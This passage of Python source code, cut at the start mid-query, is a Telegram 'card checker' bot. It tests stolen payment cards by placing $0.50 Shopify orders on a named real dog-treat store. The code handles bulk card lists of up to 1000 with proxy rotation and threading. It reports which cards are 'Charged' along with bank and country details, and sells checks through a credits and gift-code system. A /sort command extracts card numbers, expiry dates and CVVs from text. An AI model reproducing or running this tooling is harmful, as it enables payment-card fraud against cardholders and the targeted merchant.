remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{groupType availableOn deliveryStrategy{handle title methodType __typename}lineAmount{amount currencyCode __typename}targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productTitle digest requiresShipping __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}...on FailedRemoteCheckout{shopId checkoutSessionToken recoveryUrl negotiatedProposal{merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{title subtitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}__typename}...on ContextualizedProductVariantMerchandise{title subtitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}__typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}failedRemoteReceipt:remoteReceipt{remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}',
    'variables': {
        'receiptId': rid,
        'sessionToken': x,
    },
    'operationName': 'PollForReceipt',
    }
    
    status = "Declined!❌"
    resp_msg = "Processing Failed!"
    
    max_retries = 5
    order_details = {}
    
    for attempt in range(max_retries):
        random_delay(0.3, 0.6)  # Minimal delay between polls
        # MODIFICATION: Removed explicit proxy=, session handles it
        final_response = session.post('https://wagsterdogtreats.com/checkouts/unstable/graphql', 
                                      params=params, 
                                      headers=headers, 
                                      json=json_data)
        final_text = final_response.text
        
        print(f"\n=== Poll Attempt {attempt + 1} DEBUG ===")
        print(f"Status Code: {final_response.status_code}")
        print(f"Response Length: {len(final_text)} chars")
        print(f"Response Snippet: {final_text[:300]}...")
        
        if "thank" in final_text.lower() or '"__typename":"ProcessedReceipt"' in final_text:
            status = "Charged🔥"
            resp_msg = "ORDER_PLACED 💎"
            
            print(f"\n🔥 ORDER SUCCESSFUL! 🔥")
            print(f"Full Response: {final_text[:1000]}...")
            
            try:
                response_json = json.loads(final_text)
                receipt_data = response_json.get('data', {}).get('receipt', {})
                
                order_id = receipt_data.get('id', 'N/A')
                redirect_url = receipt_data.get('redirectUrl', 'N/A')
                confirmation_url = receipt_data.get('confirmationPage', {}).get('url', 'N/A')
                order_status_url = receipt_data.get('orderStatusPageUrl', 'N/A')
                
                order_details = {
                    'order_id': order_id,
                    'redirect_url': redirect_url,
                    'confirmation_url': confirmation_url,
                    'order_status_url': order_status_url
                }
                
                print(f"Order ID: {order_id}")
                print(f"Redirect URL: {redirect_url}")
                print(f"Confirmation URL: {confirmation_url}")
                print(f"Order Status URL: {order_status_url}")
                
            except Exception as e:
                print(f"Error parsing order details: {e}")
            break
        elif "actionrequiredreceipt" in final_text.lower():
            status = "Declined!❌"
            resp_msg = "3D_SECURE_REQUIRED"
            print(f"\n❌ 3D Secure Required")
            print(f"Response: {final_text[:500]}...")
            break
        elif "processingreceipt" in final_text.lower() or "waitingreceipt" in final_text.lower():
            print("⏳ Still processing...")
            time.sleep(0.5)  # Minimal wait during processing
            continue
        else:
            # Try to extract error code
            error_code = find_between(final_text, '"code":"', '"').lower()
            print(f"\n❌ Payment Failed")
            print(f"Error Code: {error_code}")
            print(f"Response: {final_text[:500]}...")
            
            if "fraud" in error_code or "buyerproposal" in final_text.lower():
                resp_msg = "FRAUD_SUSPECTED"
            elif "insufficient_funds" in error_code:
                resp_msg = "INSUFFICIENT FUNDS."
            elif "incorrect_number" in error_code:
                resp_msg = "INCORRECT NUMBER"
            elif "captcha_metadata_missing" in error_code:
                resp_msg = "COMPLETING CAPTCHA IS REQUIRED"
            else:
                resp_msg = "CARD_DECLINED"
            break
            
    elapsed_time = time.time() - start_time
    print(f"\n=== CHECK COMPLETED ===")
    print(f"Time: {elapsed_time:.2f}s")
    print(f"Status: {resp_msg}")
    print(f"========================\n")

    # Get BIN info
    bin_number = n[:6]
    bin_info = get_bin_info(bin_number)
    
    result = {
        'full_card': full_card, 
        'status': status, 
        'resp_msg': resp_msg,
        'username': username, 
        'dev': 'S H U B H',
        'dev_emoji': '👑',
        'order_details': order_details,
        'elapsed_time': f"{elapsed_time:.2f}s",
        'bin': bin_number,
        'bin_info': bin_info
    }
    return result

# The rest of the bot handlers remain the same...
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    add_user(user_id, username)
    
    credits = get_user_credits(user_id)
    
    start_text = f"""👑 DARKXCODE CHECKER 👑

💳 **Your Credits:** {credits}

**How to use:**
- Send cards directly in a message.
- Upload a `.txt` file with one card per line.

**Available Commands:**
━━━━━━━━━━━━━
`/sh card` - Check single card (1 credit)
`/msh cards` - Check multiple cards
`/credits` - View your credits
`/redeem CODE` - Redeem gift code
`/addproxy ip:port:user:pass`
`/removeproxies` - Clear all proxies
`/myproxies` - View current proxies
`/sort cards` - Format and remove duplicates
━━━━━━━━━━━━━
⚡ GATE - 0.50$ SHOPIFY (Speed Optimized)
👑 Dev: @ISHANT_OFFICIAL
"""
    bot.reply_to(message, start_text, parse_mode='Markdown')

@bot.message_handler(commands=['sort'])
def sort_cards(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Please provide text to extract cards from.\nUsage: /sort [text containing cards]")
            return
            
        text_to_sort = args[1]
        pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        found_cards = re.findall(pattern, text_to_sort)
        
        if not found_cards:
            bot.reply_to(message, "No valid cards found in the provided text.")
            return
            
        unique_formatted_cards = set()
        for card_tuple in found_cards:
            card_num, month, year_raw, cvv = card_tuple
            
            if len(year_raw) == 4 and year_raw.startswith("20"):
                year = year_raw[2:]
            else:
                year = year_raw.zfill(2)[-2:]
            
            month_formatted = month.zfill(2)
            formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
            unique_formatted_cards.add(formatted_card)
            
        output_text = "\n".join(sorted(list(unique_formatted_cards)))
        
        if output_text:
            bot.reply_to(message, f"```\n{output_text}\n```", parse_mode='Markdown')
        else:
            bot.reply_to(message, "No valid cards were found after formatting.")

    except Exception as e:
        print(f"An error occurred in /sort command: {e}")
        bot.reply_to(message, "An error occurred while trying to sort the cards.")

@bot.message_handler(commands=['sh'])
def check_card(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    
    # Check if user exists
    add_user(user_id, username)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < 1:
        bot.reply_to(message, "❌ Insufficient credits! You need at least 1 credit to check a card.\n\nUse /redeem to redeem a gift code.")
        return
    
    try:
        card_details = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.reply_to(message, "Invalid format. Use /sh cardnumber|mm|yy|cvc")
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    sent_msg = bot.reply_to(message, "⏳ Checking your card, please wait...")
    
    # --- MODIFICATION ---
    # Get a random proxy for this single check
    current_proxy = get_random_proxy()
    # Call the modified sh function, passing the proxy
    result = sh(card_details, username, proxy_to_use=current_proxy)
    # --- END MODIFICATION ---

    if isinstance(result, str):
        response_text = f"Error: {result} ❌"
    else:
        # Format status
        if "Charged" in result['status']:
            status_emoji = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅"
            response_format = f"⤿{result['resp_msg']}⤾"
        else:
            status_emoji = result['status']
            response_format = result['resp_msg']
        
        bin_info = result['bin_info']
        remaining_credits = get_user_credits(user_id)
        
        response_text = f"""#Shopify_Charge | T R U S T [/sh]
━━━━━━━━━━━━━
[ϟ] Card: {result['full_card']}
[ϟ] Gateway: Shopify 0.50$
[ϟ] Status: {status_emoji}
[ϟ] Response: {response_format}
━━━━━━━━━━━━━
[ϟ] Bin: {result['bin']}
[ϟ] Info: {bin_info['scheme']} - {bin_info['type']} - PERSONAL
[ϟ] Bank: {bin_info['bank']}
[ϟ] Country: {bin_info['country']} - [{bin_info['emoji']}]
━━━━━━━━━━━━━
[ϟ] Checked By: @{result['username']} [ 💎 PREMIUM ]
[⌥] Dev: {result['dev']} - {result['dev_emoji']}
━━━━━━━━━━━━━
[ϟ] Time: [{result['elapsed_time']}] | Credits: [{remaining_credits}] | Status: [Live 🌥]"""
    
    try:
        bot.edit_message_text(response_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
    except Exception as e:
        print(f"Could not edit message: {e}")
        bot.reply_to(message, response_text)

# --- MODIFIED process_card_list FUNCTION ---

def process_card_list(message, cards, username):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not cards:
        bot.reply_to(message, "No valid cards found to check.")
        return

    total_cards = len(cards)
    if total_cards > 1000:
        bot.reply_to(message, f"Too many cards. Please provide a maximum of 1000 cards. You provided {total_cards}.")
        return
    
    # Check if user has enough credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        bot.reply_to(message, f"❌ Insufficient credits! You have {credits} credits but need {total_cards} credits to check all cards.")
        return
    
    # Thread-safe structures for tracking results
    stats_lock = threading.Lock()
    stats_counters = {'charged': 0, 'auth': 0, 'declined': 0, 'errors': 0}
    
    # Define batch size
    BATCH_SIZE = 10
    
    # Process cards in batches
    num_batches = math.ceil(total_cards / BATCH_SIZE)
    
    # This index will rotate proxies *per card*
    proxy_card_index = 0
    
    # Send initial progress message
    progress_msg = "(🝮︎) PROCESSING\n(🝮︎) Charged: 0\n(🝮︎) 3D Auth: 0\n(🝮︎) Declined: 0\n(🝮︎) Errors: 0\n(🝮︎) Processed: 0/{total_cards}\n⏹️ Stop anytime"
    sent_msg = bot.reply_to(message, progress_msg)
    processed = 0
    
    for i, batch in enumerate(create_batches(cards, BATCH_SIZE)):
        threads = []
        
        # Check credits for the whole batch
        current_credits = get_user_credits(user_id)
        cards_in_batch_to_process = min(len(batch), current_credits)
        
        if cards_in_batch_to_process < len(batch):
             bot.send_message(chat_id, f"⚠️ Ran out of credits! Processing {cards_in_batch_to_process} cards instead of {len(batch)}.")
        
        if cards_in_batch_to_process <= 0:
            bot.send_message(chat_id, f"⚠️ Ran out of credits! Stopping check.")
            break # Stop processing batches

        # Only process the number of cards they have credits for
        for j in range(cards_in_batch_to_process):
            card_details = batch[j]
            
            # Deduct credit before starting thread
            deduct_credit(user_id) 
            
            # --- This is the proxy rotation logic ---
            # It rotates *per card* and wraps around the list
            current_proxy = None
            if proxy_list:
                current_proxy = proxy_list[proxy_card_index % len(proxy_list)]
                proxy_card_index += 1 # Increment for each card
            
            # Create and start the thread
            t = threading.Thread(target=check_card_worker_safe, 
                                 args=(card_details, username, current_proxy, stats_counters, stats_lock, chat_id))
            threads.append(t)
            t.start()
        
        # Wait for all threads in this batch to complete
        for t in threads:
            t.join()
        
        # Update processed count
        processed += cards_in_batch_to_process
        
        # Update progress message
        with stats_lock:
            progress_msg = f"(🝮︎) PROCESSING\n(🝮︎) Charged: {stats_counters['charged']}\n(🝮︎) 3D Auth: {stats_counters['auth']}\n(🝮︎) Declined: {stats_counters['declined']}\n(🝮︎) Errors: {stats_counters['errors']}\n(🝮︎) Processed: {processed}/{total_cards}\n⏹️ Stop anytime"
        try:
            bot.edit_message_text(progress_msg, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
        except Exception:
            pass
        
        # If we stopped early due to credits, break the outer loop
        if cards_in_batch_to_process < len(batch):
            break
            
        # Small delay before next batch
        if (i+1) < num_batches:
            time.sleep(1) # Delay to avoid spamming
        
    # --- All batches done ---
    
    # Final summary
    with stats_lock:
        completion_msg = f"✅ BULK COMPLETE\n(🝮︎) Charged: {stats_counters['charged']}\n(🝮︎) 3D: {stats_counters['auth']}\n(🝮︎) Declined: {stats_counters['declined']}\n(🝮︎) Errors: {stats_counters['errors']}"
    
    # Edit the progress message to the final summary
    try:
        bot.edit_message_text(completion_msg, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
    except Exception as e:
        print(f"Error editing final message: {e}")
        bot.send_message(chat_id, completion_msg)


@bot.message_handler(commands=['msh'])
def mass_check_cards(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Invalid format. Use /msh followed by a list of cards.")
            return
            
        card_list_raw = args[1]
        cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
        username = message.from_user.username or "USER"
        
        # Call the new threaded function
        process_card_list(message, cards, username)

    except Exception as e:
        print(f"An unexpected error occurred in /mass command: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please check the logs.")

@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    try:
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            bot.reply_to(message, "Invalid file type. Please upload a `.txt` file. ❌")
            return

        file_info = bot.get_file(doc.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        username = message.from_user.username or "USER"

        # Call the new threaded function
        process_card_list(message, cards, username)

    except Exception as e:
        print(f"Error handling document: {e}")
        bot.reply_to(message, "An error occurred while processing the file.")

def test_proxy(proxy_dict):
    """Test proxy by making a request and return response time in ms"""
    try:
        test_url = "https://wagsterdogtreats.com"
        start_time = time.time()
        response = requests.get(test_url, proxies=proxy_dict, timeout=10)
        elapsed_ms = int((time.time() - start_time) * 1000)
        
        if response.status_code == 200:
            return True, elapsed_ms
        else:
            return False, 0
    except Exception as e:
        return False, 0

@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    global proxy_list
    try:
        proxy_string = message.text.split(maxsplit=1)[1]
        
        parts = proxy_string.split(':')
        if len(parts) != 4:
            bot.reply_to(message, "Invalid proxy format. ❌\nPlease use: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
            return

        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        
        new_proxy = {
            "http": proxy_url,
            "https": proxy_url
        }
        
        # Send testing message
        testing_msg = bot.reply_to(message, f"🔍 Testing proxy: `{ip}:{port}`\nPlease wait...", parse_mode='Markdown')
        
        # Test the proxy
        is_working, response_time = test_proxy(new_proxy)
        
        if is_working:
            proxy_list.append(new_proxy)
            bot.edit_message_text(
                f"✅ Proxy added successfully!\n\n"
                f"📍 Proxy: `{ip}:{port}`\n"
                f"⚡ Response Time: `{response_time}ms`\n"
                f"📊 Total Proxies: `{len(proxy_list)}`",
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                parse_mode='Markdown'
            )
        else:
            bot.edit_message_text(
                f"❌ Proxy test failed!\n\n"
                f"📍 Proxy: `{ip}:{port}`\n"
                f"⚠️ Status: Not working or timeout\n"
                f"💡 Please check your proxy credentials and try again.",
                chat_id=testing_msg.chat.id,
                message_id=testing_msg.message_id,
                parse_mode='Markdown'
            )

    except IndexError:
        bot.reply_to(message, "Please provide a proxy. ❌\nUsage: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"An error occurred while adding the proxy: {e}")

@bot.message_handler(commands=['removeproxies'])
def remove_proxies(message):
    global proxy_list
    proxy_list.clear()
    bot.reply_to(message, "All proxies have been successfully removed. ✅")

@bot.message_handler(commands=['myproxies'])
def my_proxies(message):
    if proxy_list:
        testing_msg = bot.reply_to(message, "🔍 Testing all proxies...\nPlease wait...")
        
        proxy_status = []
        for idx, proxy in enumerate(proxy_list, 1):
            host = proxy['http'].split('@')[-1]
            is_working, response_time = test_proxy(proxy)
            
            if is_working:
                status = f"{idx}. `{host}` - ✅ {response_time}ms"
            else:
                status = f"{idx}. `{host}` - ❌ Not working"
            
            proxy_status.append(status)
        
        proxy_info = "\n".join(proxy_status)
        bot.edit_message_text(
            f"📊 **Current Proxies ({len(proxy_list)})**\n\n{proxy_info}",
            chat_id=testing_msg.chat.id,
            message_id=testing_msg.message_id,
            parse_mode='Markdown'
        )
    else:
        bot.reply_to(message, "No proxies are currently set. ℹ️")

@bot.message_handler(commands=['credits'])
def check_credits(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    add_user(user_id, username)
    
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str in data['users']:
        user = data['users'][user_id_str]
        credits = user.get('credits', 0)
        total_checks = user.get('total_checks', 0)
        bot.reply_to(message, f"💳 **Your Account**\n\n💰 Credits: {credits}\n📊 Total Checks: {total_checks}\n\nUse /redeem to add more credits!", parse_mode='Markdown')
    else:
        bot.reply_to(message, "💳 Credits: 0\n📊 Total Checks: 0\n\nUse /redeem to add credits!", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = message.from_user.id
    username = message.from_user.username or "USER"
    add_user(user_id, username)
    
    try:
        code = message.text.split(maxsplit=1)[1].strip().upper()
    except IndexError:
        bot.reply_to(message, "❌ Invalid format. Use: /redeem CODE")
        return
    
    success, result = redeem_gift_code(code, user_id)
    
    if success:
        new_credits = get_user_credits(user_id)
        bot.reply_to(message, f"✅ Gift code redeemed successfully!\n\n💰 Added: {result} credits\n💳 Total Credits: {new_credits}")
    else:
        bot.reply_to(message, f"❌ {result}")

# Admin commands
@bot.message_handler(commands=['gift'])
def generate_gift(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Invalid format. Use: /gift <credits>\nExample: /gift 100")
            return
        
        credits = int(args[1])
        
        if credits <= 0:
            bot.reply_to(message, "❌ Credits must be a positive number.")
            return
        
        code = generate_gift_code(credits, user_id)
        bot.reply_to(message, f"✅ Gift code generated successfully!\n\n🎁 Code: `{code}`\n💰 Credits: {credits}\n\nShare this code with users to redeem.", parse_mode='Markdown')
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid credits amount. Please provide a valid number.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating gift code: {e}")

@bot.message_handler(commands=['addcredits'])
def add_credits_admin(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "❌ Invalid format. Use: /addcredits <user_id> <credits>\nExample: /addcredits 123456789 100")
            return
        
        target_user_id = int(args[1])
        credits = int(args[2])
        
        if credits <= 0:
            bot.reply_to(message, "❌ Credits must be a positive number.")
            return
        
        add_credits(target_user_id, credits)
        new_balance = get_user_credits(target_user_id)
        bot.reply_to(message, f"✅ Credits added successfully!\n\n👤 User ID: {target_user_id}\n💰 Added: {credits} credits\n💳 New Balance: {new_balance}")
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid input. Please provide valid numbers.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error adding credits: {e}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        data = load_data()
        
        total_users = len(data['users'])
        total_checks = sum(user.get('total_checks', 0) for user in data['users'].values())
        unused_codes = sum(1 for code in data['gift_codes'].values() if not code['is_used'])
        used_codes = sum(1 for code in data['gift_codes'].values() if code['is_used'])
        
        stats_text = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━
👥 Total Users: {total_users}
✅ Total Checks: {total_checks}
🎁 Active Gift Codes: {unused_codes}
🎫 Redeemed Codes: {used_codes}
━━━━━━━━━━━━━
👑 Admin: @ISHANT_OFFICIAL
"""
        bot.reply_to(message, stats_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching stats: {e}")

if __name__ == '__main__':
    print("Starting CHECKER Bot...")
    
    # Suppress telebot logging
    logging.getLogger('telebot').setLevel(logging.CRITICAL)
    
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            print(f"Bot is now online and ready! 🔥")
            bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
            break
        except KeyboardInterrupt:
            print("Bot stopped by user ✋")
            break
        except Exception as e:
            error_msg = str(e)
            if "409" in error_msg:
                retry_count += 1
                if retry_count < max_retries:
                    print(f"Conflict detected. Retrying... ({retry_count}/{max_retries}) ⏳")
                    time.sleep(3)
                else:
                    print("Multiple bot instances detected. Please manually stop other bots first. ❌")
                    break
            elif "Network" in error_msg or "Connection" in error_msg:
                print("Network issue detected. Retrying in 5 seconds... 🌐")
                time.sleep(5)
                continue
            else:
                print(f"Bot error: {error_msg[:80]}... ❌")
                break
    
    print("Bot session ended.")
